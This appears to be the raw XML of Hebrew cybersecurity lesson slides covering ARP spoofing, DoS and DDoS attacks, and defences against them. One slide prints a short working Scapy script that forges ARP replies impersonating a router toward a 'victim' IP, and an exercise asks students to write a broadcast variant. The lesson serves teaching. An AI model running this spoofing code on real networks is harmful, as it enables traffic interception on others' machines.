              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7653130" y="642594"/>
            <a:ext cx="3472070" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלה נוספת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87C37A09-079F-43A3-8800-51CEB3138F42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נתון הקוד הבא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>scapy.all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> import *</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הקורבן</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = '192.168.1.5’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הראוטר</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = '192.168.1.1'</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoof_arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arp_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = ARP(op=2, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>psrc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pdst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hwdst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ff:ff:ff:ff:ff:ff</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    send(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arp_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שליחת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ARP Spoofing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoof_arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25677747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00D123-A4E7-4351-8B2A-FFB29AA44F65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5665304" y="642594"/>
            <a:ext cx="5459896" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שאלה נוספת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01B84697-18EA-4308-A070-91A65048DDD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. תנתח את הפונקציה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoof_arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arp_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = ARP(op=2, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>psrc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gateway_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pdst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hwdst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ff:ff:ff:ff:ff:ff</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    send(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arp_response</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. תן דוגמא משלך לתקיפה כמו זו, רק עם שינוי של שליחת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>broadcast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לכולם?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="194681952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9D1330CA-E627-4E6B-BE4E-4404A249D9A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2272085"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>התקפת מניעת שירות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18358683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020DD35-6514-4BFC-83A0-5EB60197235D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3250096" y="642594"/>
            <a:ext cx="7875104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי התקפת מניעת שירות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38E81477-F759-4501-9C54-F6BE64F7F44A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2122998"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת מניעת שירות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :(Denial of Service) DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא ניסיון להשבית או להאט את שירותי המחשב או השרת כך שהם לא יהיו זמינים למשתמשים החוקיים. זה יכול להתרחש בדרכים רבות, אך בדרך כלל הוא כולל הצפת השרת או הרשת בבקשות שגוזלות את המשאבים שלו, או ניצול חולשות במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25193854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DD0EAB-2C91-47F7-8C9C-1843D99CD513}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3617842" y="642594"/>
            <a:ext cx="7507357" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – התקפת מניעת שירות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C477B6F8-3B90-4992-9F19-F767B748F561}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2800" b="1" u="sng" dirty="0"/>
              <a:t>סוגים עיקריים של התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" u="sng" dirty="0"/>
              <a:t>DoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מבוססת על רשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Flooding Attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הצפה של השרת או הרשת בכמות עצומה של תעבורה כדי למנוע מהמשאבים להיענות לבקשות חוקיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :SYN Flood </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מנצלת את פרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TCP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לשלוח בקשות חיבור רבות לשרת מבלי להשלים את התהליך. השרת נשאר עם חיבורים פתוחים וממתין לאישור, דבר שמוביל לניצול המשאבים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> DoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מבוססת על יישומים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :Application Layer Attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פועלת על שכבת היישום של פרוטוקול ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או פרוטוקולים אחרים. לדוגמה, שליחת בקשות רבות שמביאות את השרת להאט או לקרוס בגלל עומס על היישום עצמו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Distributed Denial of Service (DDoS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה שבה תוקפים משתמשים במספר מחשבים זרים כדי להציף את היעד בבקשות. ההתקפה נעשית על ידי צבא של מחשבים מותקפים, הידוע גם כ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5235524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2B05279-A438-4C9D-8EB8-EE5CA2464F52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2912164" y="642594"/>
            <a:ext cx="8213035" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך מתמודדים עם התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C70B9CFA-C8B7-4452-8618-C9563DDCDC26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בחומות אש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חומות אש יכולות לסנן תעבורה בלתי רצויה ולהגביל את כמות הבקשות שמגיעות לשרתים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שירותי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>CDN (Content Delivery Network)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CDN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לשמש כמסנן לתעבורה ולפזר את הבקשות על פני מספר שרתים, מה שמסייע בהפחתת העומס על השרתים המרכזיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעת התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלים מיוחדים לזיהוי ומניעת התקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולים לשפר את יכולת ההגנה של הרשת על ידי ניתוח התעבורה וזיהוי תנועות חשודות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24270598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6C24B0-4847-4B2E-B4D3-630C6EA1A0FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3597964" y="642594"/>
            <a:ext cx="7527235" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת מניעת שירות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71A957EA-788C-453B-8871-C1C19F867040}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>טכניקות התקפה נוספות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Resource Exhaustion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת חוויות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Resource Exhaustion Attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מבוצעת על ידי ניצול חולשות בתכנות או בתצורת השרת כדי להותיר את השרת ללא משאבים, כמו זיכרון או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
